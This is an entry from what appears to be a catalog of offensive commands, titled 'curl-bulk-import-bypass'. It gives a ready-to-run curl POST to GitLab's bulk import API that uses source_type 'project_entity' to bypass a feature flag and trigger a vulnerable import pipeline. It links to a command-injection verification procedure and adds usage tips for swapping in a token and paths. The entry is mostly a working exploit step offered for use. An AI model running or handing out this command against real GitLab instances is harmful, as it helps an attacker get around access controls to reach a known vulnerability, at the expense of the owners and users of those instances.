---
id: cmd-curl-bulk-import-bypass
data: >-
  curl 'https://gitlab.com/import/bulk_imports.json' -H 'content-type:
  application/json' -H 'PRIVATE-TOKEN: token' --data-raw
  '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"group1aaa"}]}'
tags:
  - api
  - bypass
  - curl
type: command
output: JSON response indicating import started
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.560Z'
verified: false
validated: true
submitted: true
---
# curl-bulk-import-bypass

## Command

```bash
curl 'https://gitlab.com/import/bulk_imports.json' -H 'content-type: application/json' -H 'PRIVATE-TOKEN: token' --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"group1aaa"}]}'
```

## Description

Sends a POST request to bypass the feature flag by using source_type 'project_entity' to trigger the vulnerable import pipeline directly.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| curl | HTTP client | Yes |
| -H | Headers (content-type, token) | Yes |
| --data-raw | JSON payload | Yes |
| source_type | 'project_entity' for bypass | Yes |

## Examples

### Basic Usage

As above, replace token and paths.

### Advanced Usage

With verbose: add -v flag.

## Expected Output

{"message":"Bulk import created"} or similar success JSON.

## Related

- [[procedures/Verify-Command-Injection-and-Bypass-Feature-Flag]]
